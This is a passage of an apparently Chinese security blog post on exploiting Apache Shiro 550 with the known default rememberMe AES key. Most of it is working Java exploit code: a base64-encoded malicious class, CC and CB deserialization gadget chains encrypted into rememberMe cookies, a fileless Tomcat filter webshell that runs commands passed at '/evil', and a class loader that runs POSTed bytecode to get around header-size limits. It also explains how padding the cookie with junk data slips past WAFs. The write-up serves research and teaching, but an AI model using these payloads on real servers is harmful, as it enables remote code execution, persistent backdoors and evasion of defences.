BXDAAdAFgHAFkMAFoAWwEAEGphdmEvbGFuZy9TdHJpbmcMABIAXAcAXQwAXgBfBwBgDABhAGIBAARjYWxjDABjAGQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MABIAZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABBqYXZhL3V0aWwvQmFzZTY0AQAKZ2V0RW5jb2RlcgEAB0VuY29kZXIBAAxJbm5lckNsYXNzZXMBABwoKUxqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXI7AQArY29tL3N1bi9vcmcvYXBhY2hlL2JjZWwvaW50ZXJuYWwvUmVwb3NpdG9yeQEAC2xvb2t1cENsYXNzAQBJKExqYXZhL2xhbmcvQ2xhc3M7KUxjb20vc3VuL29yZy9hcGFjaGUvYmNlbC9pbnRlcm5hbC9jbGFzc2ZpbGUvSmF2YUNsYXNzOwEANGNvbS9zdW4vb3JnL2FwYWNoZS9iY2VsL2ludGVybmFsL2NsYXNzZmlsZS9KYXZhQ2xhc3MBAAhnZXRCeXRlcwEABCgpW0IBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAAYoW0IpW0IBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQAFKFtCKVYBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAFcHJpbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEAAwARAAAAAAAFAAEAEgATAAEAFAAAAC8AAQABAAAABSq3AAGxAAAAAgAVAAAABgABAAAAEgAWAAAADAABAAAABQAXABgAAAAJABkAGgABABQAAABaAAQAAgAAAB64AAISA7gABLYABbYABkyyAAe7AAhZK7cACbYACrEAAAACABUAAAAOAAMAAAAcAA8AHQAdAB4AFgAAABYAAgAAAB4AGwAcAAAADwAPAB0AHgABAAEAHwAgAAIAFAAAAD8AAAADAAAAAbEAAAACABUAAAAGAAEAAAAiABYAAAAgAAMAAAABABcAGAAAAAAAAQAhACIAAQAAAAEAIwAkAAIAJQAAAAQAAQAmAAEAHwAnAAIAFAAAAEkAAAAEAAAAAbEAAAACABUAAAAGAAEAAAAmABYAAAAqAAQAAAABABcAGAAAAAAAAQAhACIAAQAAAAEAKAApAAIAAAABACoAKwADACUAAAAEAAEAJgAIACwAEwABABQAAABmAAMAAQAAABe4AAsSDLYADUunAA1LuwAPWSq3ABC/sQABAAAACQAMAA4AAwAVAAAAFgAFAAAAFQAJABgADAAWAA0AFwAWABkAFgAAAAwAAQANAAkALQAuAAAALwAAAAcAAkwHADAJAAIAMQAAAAIAMgBPAAAACgABADsANABOAAk="); // 这个恶意类必须继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`抽象类, 之前有分析过, 就不提及了.        bytecodes.set(templates, myBytes);        name.set(templates, "");        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});        HashMap<Object, Object> map = new HashMap<>();        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map, invokerTransformer); // 创建一个 lazyMap 对象        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates); // 由于 TiedMapEntry 可以传入任意值, 所以这里可以调用        BadAttributeValueExpException o = new BadAttributeValueExpException(null); // 防止构造方法中就调用 toString        Field val = o.getClass().getDeclaredField("val");        val.setAccessible(true);        val.set(o, tiedMapEntry); // 避开构造方法之后, 通过反射改回来恶意对象        // 如上已准备好 CC 链        ByteArrayOutputStream bos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(bos);        oos.writeObject(o);        byte[] escapeData = bos.toByteArray();        // 如上已准备好序列化后的值        AesCipherService aesCipherService = new AesCipherService(); // 创建 AES 加密器.        ByteSource encrypt = aesCipherService.encrypt(escapeData, Base64.decode("kPH+bIxk5D2deZiIxcaaaA=="));        System.out.println(encrypt.toBase64()); // 准备 Base64 值    }}
```  
  
最终可弹计算器:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQpibibfneibtUG9Kkdw4GzcaZzUa58icJrTQwasiaRJ2nEFf9VBm4nqyNY4w/640?wx_fmt=png&from=appmsg "")  
  
image-20241016212318602.png  
###### 利用 CB 链  
  
前面介绍我们最常使用的CC链, 为什么现在却要使用CB链？因为Shiro  
的pom.xml  
文件中, 并没有引入CC链  
, 引入的是CB链  
, 所以CB链  
才是Shiro  
漏洞运用的核心. 我们可以看一下Shiro  
的pom.xml  
:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQuLQ0c5jHe09d4Ria5A7KUlduxDzK8Tf3oDwkPvAZ1k8koOIXT87HInA/640?wx_fmt=png&from=appmsg "")  
  
image-20241017165601745.png  
  
操作过程就不掩饰了, 看笔者之前深入学习 Java 反序列化漏洞 (URLDNS链 + CC1~7链附手挖链 + CB链)  
文章中的链路就可以打.  
#### 无文件落地内存马注入  
##### servletContext 域对象获取  
  
我们要注入内存马 (通过无文件落地的方式), 肯定是需要ServletContext  
, 在我们之前研究内存马注入时,request域  
对象中封装了ServletContext  
, 所以我们有request域  
对象也可以.  
  
而我们在一个恶意类中, 如何获取Tomcat  
中全局的ServletContext  
对象成了一个问题.  
###### Tomcat 获取域对象  
  
根据 Tomcat 的 WebappClassLoader 来获取 request 域对象.  
```
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); // 得到当前线程的 ClassLoaderWebResourceRoot resources = webappClassLoaderBase.getResources(); // 得到 WebResourceRoot 对象StandardContext context = (StandardContext) resources.getContext(); // 得到上下文对象
```  
  
其核心原理则是, 通过Thread.currentThread().getContextClassLoader()  
得到当前Tomcat  
下的ClassLoader  
, 也就是WebappClassLoader  
. 再通过WebappClassLoader  
得到WebResourceRoot  
, 在WebResourceRoot  
中得到ServletContext  
.  
  
但是这个方法会受到Tomcat  
版本限制. 在Tomcat  
某些版本, 下面是8.5.100  
与8.5.50  
的getResources  
方法对比:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQno9FWM2Z4cORHIReoxNORSYAdsiagGyAtiaYlltsrAMmHrqyN2cLx2CQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241018105847239.png  
  
可以看到, 不同版本存在着不同的差异. 具体版本差异笔者参考了下面的文章, 说的是8.5.78版本往后的这个方法都无法获取了.  
> 参考: https://xz.aliyun.com/t/13254  
  
###### SpringMVC 获取域对象  
  
SpringMVC  
提供了RequestContextHolder  
, 这个方法可以获取当前线程中的Request域  
对象, 而在Spring  
```
ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();HttpServletRequest request = requestAttributes.getRequest();
```  
  
理论来讲,SpringMVC && SpringBoot  
在正常开发时, 是可以进行获取到的, 我们准备如下代码, 进行测试:  
```
public class TesterController {    @RequestMapping("/test")    @ResponseBody    public String test() {        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();        RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes();        System.out.println(contextClassLoader); // SpringBoot: TomcatEmbeddedWebappClassLoader        // Tomcat: ParallelWebappClassLoader        System.out.println(requestAttributes); // ShiroHttpServletRequest        return "TEST";    }}
```  
  
可以看到, 我们成功获取到了具体的HttpServletRequest  
对象.  
###### 获取域对象存在的问题  
  
为了防止大部分的排错, 调试部分占据整个文章篇幅, 笔者先告诉大家一个结论: 在我们使用Shiro550  
时, 注入内存马时, SpringBoot 可以成功, Spring MVC 会失败.  
  
原因则是:RequestContextHolder  
在SpringBoot  
中可以成功获取到request对象  
, 而在SpringMVC  
会获取到NULL. 为什么会这样？  
  
首先, 我们先看一下RequestContextHolder  
是个什么样的一个类:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQjoZ9d60ESYESA63uC05JVBU6AeWuEnp3qo7CDI56Ha0JCQwzSFST6g/640?wx_fmt=png&from=appmsg "")  
  
image-20241018144104631.png  
  
可以看到，该类将RequestAttributes  
放入到了自己的inheritableRequestAttributesHolder  
这个ThreadLocal  
中. 那么我们整个线程中就可以通过getRequestAttributes  
进行获取.  
  
那么, 哪里初始化了这个类, 并将request  
设置到这个ThreadLocal  
中？  
  
笔者也不卖关子, 在我们配置SpringMVC  
的DispatcherServlet  
中, 会对request  
进行封装, 调用RequestContextHolder::setRequestAttributes  
中, 我们观察下图:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQQ73QPmVyGPu9s8P4SyTQZXmL75sfQibmHXFeeXEdVKR7uwvMPIv9c7g/640?wx_fmt=png&from=appmsg "")  
  
image-20241018145919814.png  
  
我们知道的是,DispatcherServlet  
是整个SpringMVC  
中的分发器, 当一个Http请求  
过来, 会先进入到DispatcherServlet::service  
方法, 最终该方法会调用doGet  
方法, 我们可以看一下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQqnXT1tluOhUO6391W9ohHW15VsCYsqT5BMp6cfNr6xq49StTCGBrPQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241018150739202.png  
  
我们可以看到, 在doGet  
方法中, 会对RequestContextHolder  
进行初始化操作, 也就是说, 我们每次从SpringMVC  
调用到我们的Controller  
之前,RequestContextHolder  
已经被初始化了, 所以我们刚刚定义的Controller  
,SpringMVC && SpringBoot  
都可以获取到RequestContextHolder  
.  
  
但是我们注意到的是,ShiroFilter  
是一个Filter  
, 那么根据Tomcat  
设计思想,Listener > Filter > Servlet  
, 所以在我们Filter  
层触发漏洞时,DispatcherServlet  
还并未对RequestContextHolder  
进行初始化. 所以我们不可能在Filter  
层进行得到Servlet  
层中初始化的request  
对象.  
  
为了方便后续的描述, 笔者先放一下笔者在调试Shiro  
漏洞时,SpringBoot && SpringMVC  
的两种不同的返回情况吧:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQhyWI5MXm9DueCDrO7XQKV6N0XtEKpsyJYnTOSA6PLZMnxrK5oqT3fg/640?wx_fmt=png&from=appmsg "")  
  
image-20241018152230472.png  
  
下面我们来说明一下原因.  
###### SpringMVC 获取不到域对象原因  
  
我们先来看一下为什么SpringBoot  
可以获取, 在SpringBoot && SpringMVC  
都存在一个叫做RequestContextFilter  
类, 在该类的doFilter  
方法中, 也对RequestContextFilter  
进行初始化操作了:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQcDEn2Wm0u6lkjCmVZQbdDct3Gf9mfNvF8GHnBQiaBr9yvZJExiaymKOw/640?wx_fmt=png&from=appmsg "")  
  
image-20241018153139006.png  
  
而如下Filter  
是SpringBoot  
在启动时, 默认加载的:  
> CharacterEncodingFilter  
> HiddenHttpMethodFilter  
> HttpPutFormContentFilter  
> RequestContextFilter  
  
  
但SpringMVC  
并没有自动加载配置, 所以在我们调用RequestContextHolder.getRequestAttributes  
时会返回NULL  
.  
  
解决方法则是, 给SpringMVC  
配置上RequestContextFilter  
过滤器, 再来看一下结果, 准备/WEB-INF/web.xml  
:  
```
<filter>    <filter-name>RequestContextFilter</filter-name>    <filter-class>org.springframework.web.filter.RequestContextFilter</filter-class></filter> <!-- 配置在 shiroFilter 之上, 提前将 request 对象放入 RequestContext 中 --><filter-mapping>    <filter-name>RequestContextFilter</filter-name>    <url-pattern>/*</url-pattern></filter-mapping><filter>    <filter-name>shiroFilter</filter-name> <!-- filter-name 写 shiro bean 的名称 -->    <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>    <init-param>        <param-name>targetFilterLifecycle</param-name>        <param-value>true</param-value>    </init-param></filter><filter-mapping>    <filter-name>shiroFilter</filter-name>    <url-pattern>/*</url-pattern></filter-mapping><servlet>    <servlet-name>dispatcherServlet</servlet-name>    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>    <init-param>        <param-name>contextConfigLocation</param-name>        <param-value>classpath:ApplicationContext.xml</param-value>    </init-param>    <load-on-startup>1</load-on-startup></servlet><servlet-mapping>    <servlet-name>dispatcherServlet</servlet-name>    <url-pattern>/</url-pattern></servlet-mapping>
```  
  
重启Tomcat  
后, 最终运行结果:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQjVibvbhMmpHIhqnVzWjibwGbKfnibSxz36yYfKjQhmnaBdTgajRnRfABA/640?wx_fmt=png&from=appmsg "")  
  
image-20241018160848826.png  
###### 一个失败的想法  
  
由于在看底层原理时, 我们知道, 当请求过来时,ShiroFilter  
会对请求过来的request, response  
封装为subject  
对象, 并且保存在个人线程中. 笔者就会想到, 能不能通过得到Shiro  
自己封装的request  
, 先开始是使用的JSP做演示:  
```
<%    Subject subject = SecurityUtils.getSubject();    Field req = subject.getClass().getDeclaredField("servletRequest");    req.setAccessible(true);    Field modifiersField = Field.class.getDeclaredField("modifiers");    modifiersField.setAccessible(true);    modifiersField.setInt(req, req.getModifiers() & ~Modifier.FINAL); // 让其 final 也允许被赋值    ShiroHttpServletRequest thereReq = (ShiroHttpServletRequest) req.get(subject);    Field servletContextFiled = thereReq.getClass().getDeclaredField("servletContext");    servletContextFiled.setAccessible(true);    ServletContext servletContext = (ServletContext) servletContextFiled.get(thereReq);    out.println(servletContext); // org.apache.catalina.core.ApplicationContextFacade@70b8353a %>
```  
  
在JSP  
中可以成功得到ServletRequest  
对象, 而使用Shiro550  
进行内存马注入时, 会因为Subject  
获取不到产生错误.  
  
为什么获取不到呢？原因则是调用到Shiro  
漏洞点时,Subject  
还未被Shiro  
放入到线程中去. 最终以失败告终. 这里调试过程就不献丑了.  
##### 注入 Tomcat 内存马  
  
由于我们可以得到ServletContext | request  
对象, 所以我们可以进行内存马注入. 那么我们编写如下POC:  
```
public class NeiCunMa extends AbstractTranslet implements Filter {    @Override    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {        // 内存马请求过来主要逻辑        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;        String requestURI = httpServletRequest.getRequestURI();        System.out.println(requestURI);        if ("/evil".equals(requestURI)) {            InputStream inputStream = Runtime.getRuntime().exec(httpServletRequest.getParameter("cmd")).getInputStream();            byte[] myChunk = new byte[1024];            int i = 0;            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();            while ((i = inputStream.read(myChunk)) != -1) {                byteArrayOutputStream.write(myChunk, 0, i);            }            servletResponse.getWriter().println(new String(byteArrayOutputStream.toByteArray()));        } else {            filterChain.doFilter(servletRequest, servletResponse);        }    }    static { // 在 static 代码块中进行注入内存马        try {            ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();            HttpServletRequest request = requestAttributes.getRequest();            ServletContext servletContext = request.getServletContext();            Field ApplicationContextContext = servletContext.getClass().getDeclaredField("context"); // 得到 ApplicationContextFacade 对象的 context 字段            ApplicationContextContext.setAccessible(true);            org.apache.catalina.core.ApplicationContext applicationContext = (ApplicationContext) ApplicationContextContext.get(servletContext); // 得到 ApplicationContextFacade 对象 context 字段的对象值            Field StandardContextContext = applicationContext.getClass().getDeclaredField("context"); // 得到 ApplicationContextFacade -> context -> context 字段            StandardContextContext.setAccessible(true);            StandardContext standardContext = (StandardContext) StandardContextContext.get(applicationContext); // 得到 ApplicationContextFacade -> context -> context 对象 (StandardContext)            // 下面模拟 ServletContext::addFilter 方法中的动态生成内存马的代码块...            FilterDef filterDef = new FilterDef();            filterDef.setFilterName("heihuFilter");            standardContext.addFilterDef(filterDef);            filterDef.setFilterClass(NeiCunMa.class.getName()); // 设置自己            filterDef.setFilter(new NeiCunMa()); // 放入自己, 因为自己就是 Filter            FilterMap filterMap = new FilterMap();            filterMap.setFilterName(filterDef.getFilterName());            filterMap.setDispatcher("[REQUEST]");            filterMap.addURLPattern("/*");            standardContext.addFilterMapBefore(filterMap); // 因为该行代码操作的就是 filterMaps            // 创建 ApplicationFilterConfig, 未来往 filterConfigs 里面放            Constructor<?> declaredConstructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(Context.class, FilterDef.class);            declaredConstructor.setAccessible(true);            ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);            // 得到 filterConfigs, 并且往这个 HashMap 中放置我们的 ApplicationFilterConfig            Field filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");            filterConfigs.setAccessible(true);            HashMap<String, ApplicationFilterConfig> myFilterConfigs = (HashMap<String, ApplicationFilterConfig>) filterConfigs.get(standardContext);            myFilterConfigs.put(filterMap.getFilterName(), applicationFilterConfig);            filterConfigs.set(standardContext, myFilterConfigs);        } catch (Exception e) {}    }    @Override    public void init(FilterConfig filterConfig) throws ServletException {}    @Override    public void destroy() {}    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}}
```  
  
在static  
中进行注入内存马即可. 准备生成RememberMe  
的脚本:  
```
TemplatesImpl templates = new TemplatesImpl();Field bytecodes = templates.getClass().getDeclaredField("_bytecodes"); // 最终调用到 defineClass 方法中加载类字节码Field name = templates.getClass().getDeclaredField("_name"); // 放置任意值Field tfactory = templates.getClass().getDeclaredField("_tfactory"); // 必须放置 TransformerFactoryImpl 对象name.setAccessible(true);tfactory.setAccessible(true);bytecodes.setAccessible(true);byte[][] myBytes = new byte[1][];myBytes[0] = Repository.lookupClass(NeiCunMa.class).getBytes(); // 这个恶意类必须继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`抽象类, 之前有分析过, 就不提及了.bytecodes.set(templates, myBytes);name.set(templates, "");tfactory.set(templates, new TransformerFactoryImpl());Class<?> comparatorClazz = Class.forName("javax.swing.LayoutComparator");Constructor<?> comparatorClazzConstructor = comparatorClazz.getDeclaredConstructor();comparatorClazzConstructor.setAccessible(true);Comparator o = (Comparator) comparatorClazzConstructor.newInstance();BeanComparator beanComparator = new BeanComparator("outputProperties", o); // outputProperties 可控, 第二个参数传递一个可序列化的 Comparator.// beanComparator.compare(templates, templates); // 将可控的 templates 传入, 调用则弹计算器PriorityQueue priorityQueue = new PriorityQueue(beanComparator); // 为了防止序列化前, 就会调用 compare 方法, 这里先传递一个没用的 ComparatorField size = priorityQueue.getClass().getDeclaredField("size");size.setAccessible(true);priorityQueue.add(templates); // 将可控的 templates 传入, 调用则弹计算器size.set(priorityQueue, 0); // 通过修改 size, 防止 add 方法调用到链路priorityQueue.add(templates);size.set(priorityQueue, 2); // 将 size 改回正常的, 防止反序列化时进入不了链路// 如上已准备好 CB 链ByteArrayOutputStream bos = new ByteArrayOutputStream();ObjectOutputStream oos = new ObjectOutputStream(bos);oos.writeObject(priorityQueue);byte[] escapeData = bos.toByteArray();// 如上已准备好序列化后的值AesCipherService aesCipherService = new AesCipherService(); // 创建 AES 加密器.ByteSource encrypt = aesCipherService.encrypt(escapeData, Base64.decode("kPH+bIxk5D2deZiIxcaaaA=="));System.out.println(encrypt.toBase64()); // 准备 Base64 值
```  
  
最终生成的RememberMe  
打请求会遇到请求头最大错误:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQNnk1glfoTJDEVGPkAFx5BWltCZ1YBhduCwfBB3EmM3ONbgZ5U6nz6Q/640?wx_fmt=png&from=appmsg "")  
  
image-20241017212857119.png  
  
当我们NeiCunMa  
这个类的字节码, 实现Filter  
之后, 加入我们注入内存马的逻辑, 会变得特别大. 字节码大了, 经过AES + BASE64  
后的值会更大, 这里超过了这个大小. tomcat的maxHttpHeaderSize  
默认值只有 4096 个字节 (4k), 我们可以临时修改TOMCAT目录/conf/server.xml  
文件, 扩大maxHttpHeaderSize  
:  
```
<Connector port="8080" protocol="HTTP/1.1"           connectionTimeout="20000"           redirectPort="8443"           maxParameterCount="1000"           maxHttpHeaderSize="409600000"           />
```  
  
加入这行后, 我们打过去, 内存马就成功注入到其中了.  
###### 绕过请求头大小限制  
  
刚才我们设置的TOMCAT目录/conf/server.xml  
, 某些版本tomcat  
可以通过payload调取反射修改maxHttpHeaderSize  
，而某些又不可以.  
  
所以这里并不使用这个方法, 在这里参考其他师傅的文章, 发现可以传递一个恶意的ClassLoader  
, 执行POST  
中发送的恶意类内容.  
  
准备如下恶意类:  
```
public class EvilClassLoader extends AbstractTranslet {    static {        try {            ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();            HttpServletRequest request = requestAttributes.getRequest(); // 拿到 request            String classData = request.getParameter("classData"); // 拿到 Class 值            byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});            defineClassMethod.setAccessible(true);            Class clazz = (Class) defineClassMethod.invoke(EvilClassLoader.class.getClassLoader(), classBytes, 0, classBytes.length);            clazz.newInstance();        } catch (Exception e) {            throw new RuntimeException(e);        }    }    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}}
```  
  
很简单, 加载POST  
中的base64  
, 解码后当作类字节码进行加载, 随后我们准备如下内存马:  
```
public class NeiCunMa implements Filter {    @Override    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {        // 内存马请求过来主要逻辑        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;        String requestURI = httpServletRequest.getRequestURI();        if ("/evil".equals(requestURI)) {            InputStream inputStream = Runtime.getRuntime().exec(httpServletRequest.getParameter("cmd")).getInputStream();            byte[] myChunk = new byte[1024];            int i = 0;            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();            while ((i = inputStream.read(myChunk)) != -1) {                byteArrayOutputStream.write(myChunk, 0, i);            }            servletResponse.getWriter().println(new String(byteArrayOutputStream.toByteArray()));        } else {            filterChain.doFilter(servletRequest, servletResponse);        }    }    static { // 在 static 代码块中进行注入内存马        try {            ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();            HttpServletRequest request = requestAttributes.getRequest();            ServletContext servletContext = request.getServletContext();            Field ApplicationContextContext = servletContext.getClass().getDeclaredField("context"); // 得到 ApplicationContextFacade 对象的 context 字段            ApplicationContextContext.setAccessible(true);            org.apache.catalina.core.ApplicationContext applicationContext = (ApplicationContext) ApplicationContextContext.get(servletContext); // 得到 ApplicationContextFacade 对象 context 字段的对象值            Field StandardContextContext = applicationContext.getClass().getDeclaredField("context"); // 得到 ApplicationContextFacade -> context -> context 字段            StandardContextContext.setAccessible(true);            StandardContext standardContext = (StandardContext) StandardContextContext.get(applicationContext); // 得到 ApplicationContextFacade -> context -> context 对象 (StandardContext)            // 下面模拟 ServletContext::addFilter 方法中的动态生成内存马的代码块...            FilterDef filterDef = new FilterDef();            filterDef.setFilterName("heihuFilter");            standardContext.addFilterDef(filterDef);            filterDef.setFilterClass(NeiCunMa.class.getName()); // 设置自己            filterDef.setFilter(new NeiCunMa()); // 放入自己, 因为自己就是 Filter            FilterMap filterMap = new FilterMap();            filterMap.setFilterName(filterDef.getFilterName());            filterMap.setDispatcher("[REQUEST]");            filterMap.addURLPattern("/*");            standardContext.addFilterMapBefore(filterMap); // 因为该行代码操作的就是 filterMaps            // 创建 ApplicationFilterConfig, 未来往 filterConfigs 里面放            Constructor<?> declaredConstructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(Context.class, FilterDef.class);            declaredConstructor.setAccessible(true);            ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);            // 得到 filterConfigs, 并且往这个 HashMap 中放置我们的 ApplicationFilterConfig            Field filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");            filterConfigs.setAccessible(true);            HashMap<String, ApplicationFilterConfig> myFilterConfigs = (HashMap<String, ApplicationFilterConfig>) filterConfigs.get(standardContext);            myFilterConfigs.put(filterMap.getFilterName(), applicationFilterConfig);            filterConfigs.set(standardContext, myFilterConfigs);        } catch (Exception e) {}    }    @Override    public void init(FilterConfig filterConfig) throws ServletException {}    @Override    public void destroy() {}}
```  
  
准备如下POC生成rememberMe:  
```
public class Exp01 {    public static void main(String[] args) throws Exception {        TemplatesImpl templates = new TemplatesImpl();        Field bytecodes = templates.getClass().getDeclaredField("_bytecodes"); // 最终调用到 defineClass 方法中加载类字节码        Field name = templates.getClass().getDeclaredField("_name"); // 放置任意值        Field tfactory = templates.getClass().getDeclaredField("_tfactory"); // 必须放置 TransformerFactoryImpl 对象        name.setAccessible(true);        tfactory.setAccessible(true);        bytecodes.setAccessible(true);        byte[][] myBytes = new byte[1][];        myBytes[0] = Repository.lookupClass(EvilClassLoader.class).getBytes(); // 这个恶意类必须继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`抽象类, 之前有分析过, 就不提及了.        bytecodes.set(templates, myBytes);        name.set(templates, "");        tfactory.set(templates, new TransformerFactoryImpl());        Class<?> comparatorClazz = Class.forName("javax.swing.LayoutComparator");        Constructor<?> comparatorClazzConstructor = comparatorClazz.getDeclaredConstructor();        comparatorClazzConstructor.setAccessible(true);        Comparator o = (Comparator) comparatorClazzConstructor.newInstance();        BeanComparator beanComparator = new BeanComparator("outputProperties", o); // outputProperties 可控, 第二个参数传递一个可序列化的 Comparator.        // beanComparator.compare(templates, templates); // 将可控的 templates 传入, 调用则弹计算器        PriorityQueue priorityQueue = new PriorityQueue(beanComparator); // 为了防止序列化前, 就会调用 compare 方法, 这里先传递一个没用的 Comparator        Field size = priorityQueue.getClass().getDeclaredField("size");        size.setAccessible(true);        priorityQueue.add(templates); // 将可控的 templates 传入, 调用则弹计算器        size.set(priorityQueue, 0); // 通过修改 size, 防止 add 方法调用到链路        priorityQueue.add(templates);        size.set(priorityQueue, 2); // 将 size 改回正常的, 防止反序列化时进入不了链路        // 如上已准备好 CB 链        ByteArrayOutputStream bos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(bos);        oos.writeObject(priorityQueue);        byte[] escapeData = bos.toByteArray();        // 如上已准备好序列化后的值        AesCipherService aesCipherService = new AesCipherService(); // 创建 AES 加密器.        ByteSource encrypt = aesCipherService.encrypt(escapeData, Base64.decode("kPH+bIxk5D2deZiIxcaaaA=="));        System.out.println(encrypt.toBase64()); // 准备 Base64 值    }}
```  
  
生成POST  
中的字节码, 这里一定要进行URL编码一次, 否则会传递失败:  
```
public class MyBase64 {    public static void main(String[] args) {        String encode = URLEncoder.encode(Base64.getEncoder().encodeToString(Repository.lookupClass(NeiCunMa.class).getBytes()));        System.out.println(encode);    }}
```  
  
最终可以注入内存马, 并不报错:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQlLvsFwAajmLP2Ok0zx4ZiaJ4yMrHUIG2J6ZGFic4rM9sW8LPIsRtWodQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241018193321462.png  
> 绕过请求头大小文章推荐: https://xz.aliyun.com/t/10696#toc-9  
> https://zhuanlan.zhihu.com/p/395443877  
> javassist: https://xz.aliyun.com/t/14107  
  
#### 脏数据绕 WAF 原理  
  
在网上看到有人通过在rememberMe  
中加入脏数据, 从而成功绕过WAF  
, 下面我们来看一下为什么.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQZr6klSJiaiagdpVR7EYiciabG6ibT3Q2yaicmkZMabnMkAEfibNvSq2OaKA0w/640?wx_fmt=png&from=appmsg "")  
  
image-20241016215858547.png  
  
可以看到, 图中加了一系列脏数据, 但是计算器仍然可以弹出来. 其原因则是Shiro  
在处理Base64解码  
时的原理, 我们定位到解码函数看一下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQupBV1nNIc7dT6V625tuPRsH64ibzek8M4NlMxjyKbyCygWBH82QI8FQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241016223515633.png  
  
可以看到, 在Base64  
解密时,Shiro  
会忽略特殊字符, 这就导致成为了绕WAF  
的一种手段.  
### Shiro 721 条件: 1.2.5 - 1.4.2  
  
Shiro 721 可以说是一个密码学的一个缺陷, 漏洞触发点是一样的, 只是不再是默认KEY. 笔者密码学浅薄, 就不在这里板门弄斧了.  
